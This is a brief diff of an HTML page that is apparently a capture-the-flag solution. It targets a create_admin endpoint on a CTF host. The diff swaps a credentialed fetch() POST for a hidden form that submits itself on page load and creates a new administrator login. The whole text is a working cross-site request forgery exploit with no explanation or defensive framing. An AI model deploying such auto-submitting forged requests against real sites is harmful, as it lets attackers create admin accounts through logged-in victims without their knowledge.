@@ -1,15 +1,11 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
+<form action="http://tasks.goidactf.ru:20159/create_admin" method="POST">
+  <input type="hidden" name="new_admin_login" value="putin">
+</form>
 <script>
-fetch("http://tasks.goidactf.ru:20159/create_admin", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  body: "new_admin_login=hacker"
-});
+document.forms[0].submit();
 </script>
 </body>
 </html>
